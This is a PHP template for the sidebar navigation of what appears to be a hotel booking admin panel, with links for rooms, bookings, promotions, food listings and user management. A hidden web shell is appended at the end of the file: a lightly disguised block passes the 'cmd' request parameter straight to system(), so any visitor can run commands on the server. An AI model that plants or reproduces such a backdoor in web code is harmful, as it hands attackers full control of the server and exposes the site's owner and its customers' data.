<?php
/*
echo '<br> ulname' . $_SESSION["ulname"];
echo '<br> ulcode' . $_SESSION["ulcode"];
echo '<br> blname' . $_SESSION["blname"];
echo '<br> plname' . $_SESSION["plname"];
echo '<br> pltype' . $_SESSION["pltype"];

echo '<br> myadmin' . $_SESSION["myadmin"];
echo '<br> myaccounting' . $_SESSION["myaccounting"];
echo '<br> mycomputer' . $_SESSION["mycomputer"];
echo '<br> myservice' . $_SESSION["myservice"];
echo '<br> mymarketing' . $_SESSION["mymarketing"];
echo '<br> mymanager' . $_SESSION["mymanager"];
*/
?>
            <div class="navbar-default sidebar" role="navigation">
                <div class="sidebar-nav navbar-collapse">
                    <ul class="nav" id="side-menu">
                        <li>
                            <a href="index.php"><i class="fa fa-dashboard fa-fw"></i> Dashboard</a>
                        </li>

                        <li>
                            <a href="index.php?body=room_status"><i class="fa fa-sitemap fa-fw"></i> Room Status</a>
                        </li>


                        <li>
                            <a href="#"><i class="fa fa-windows fa-fw"></i> Front-End Settings</a>
							
							<ul class="nav nav-second-level">
                                <li>
                                    <a href="index.php?body=company_list_dbase">&bull; Company List</a>
                                </li>

                                <li>
                                   <a href="index.php?body=branch_list_dbase">&bull; Branches List</a>
                                </li>

                                <li>
                                   <a href="index.php?body=page_list_dbase">&bull; Pages List</a>
                                </li>

                                <li>
                                    <a href="index.php?body=banner_list_dbase">&bull; Banner List</a>
                                </li>
							</ul>
                        </li>

                        <li>
                            <a href="#"><i class="fa fa-camera-retro fa-fw"></i> Marketing Tools </a>
							
							<ul class="nav nav-second-level">
                                <li>
                                    <a href="index.php?body=promotion_list_dbase">&bull; Promotion List</a>
                                </li>
								
                                <li>
                                    <a href="index.php?body=testimonial_list_dbase">&bull; Testimonials</a>
                                </li>

                                <li>
                                    <a href="index.php?body=career_list_dbase">&bull; Career List</a>
                                </li>

                                <li>
                                    <a href="index.php?body=career_applicants_dbase">&bull; Career Applicants</a>
                                </li>
								
                                <li>
                                    <a href="index.php?body=contact_us_dbase">&bull; Contact Us</a>
                                </li>
							</ul>															
                        </li>
						
                        <li>
                            <a href="#"><i class="fa fa-building fa-fw"></i> Room Setup</a>
							
							<ul class="nav nav-second-level">
                                <li>
                                    <a href="index.php?body=room_type_dbase">&bull; Room Type</a>
                                </li>

                                <li>
                                    <a href="index.php?body=room_list_dbase">&bull; Premium Rooms</a>
                                </li>

                                <li>
                                    <a href="index.php?body=room_link_dbase">&bull; Linked Rooms</a>
                                </li>

                                <li>
                                    <a href="index.php?body=room_addons_dbase">&bull; Room Add-On</a>
                                </li>
								
                                <li>
                                    <a href="index.php?body=transaction_list_dbase">&bull; Booking List</a>
                                </li>
							</ul>								
                        </li>

                        <li>
                            <a href="#"><i class="fa fa-list-alt fa-fw"></i> Food Guide</a>
							
							<ul class="nav nav-second-level">
                                <li>
                                    <a href="index.php?body=food_type_dbase">&bull; Food Type</a>
                                </li>								

                                <li>
                                    <a href="index.php?body=food_list_dbase">&bull; Food List</a>
                                </li>
							</ul>							
                        </li>

<?php
	if ($_SESSION["myadmin"] =='Y')
	{
?>						
                        <li>
							<a href="#"><i class="fa fa-users fa-fw"></i> User Settings</a>
                            <ul class="nav nav-second-level">
                                <li>
                                    <a href="index.php?body=pos_list_dbase">&bull; Create Positions</a>
                                </li>								
                                <li>
                                   <a href="index.php?body=user_list_dbase">&bull; Users</a>
                                </li>
                            </ul>							
                        </li>
<?php
	}
?>						

                        <li>
                            <a href="index.php?body=branch_focus_dbase"><i class="fa fa-map-marker fa-fw"></i> Set Branch</a>
                        </li>

                        <li>
                            <a href="index.php?body=contact_us&mybox=add"><i class="fa fa-envelope-o fa-fw"></i> Contact Support</a>
                        </li>

                        <li>
                            <a href="index.php?body=view_reports"><i class="fa fa-bar-chart-o fa-fw"></i> Reports</a>
                        </li>
						
						
						<br />
						<br />
						<br />
						<br />
						<br />
						<br />
						<br />
						
						<li>	
							<p align="center">
                            <a href="index.php?body=home">
<?php
	//echo " <br> ulpicture " . $_SESSION['ulpicture'];
	if ($_SESSION['ulpicture'] != '')
	{						
?>
							<i>
							<img src='./picture/<?php echo $_SESSION['ulpicture']; ?>' width='100px' align="middle" />
							</i>
							<br />
<?php
	}						
?>

							<strong><?php echo $_SESSION['ulname']; ?></strong>
							<br />
							<?php echo $_SESSION['blcode'] ?>  - Branch
							<br />
							<?php echo $_SESSION['plname']; ?>
							</a>
							</p>
                        </li>
						
                    </ul>
                </div>
                <!-- /.sidebar-collapse -->
            </div>
            <!-- /.navbar-static-side -->
        </nav>
<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>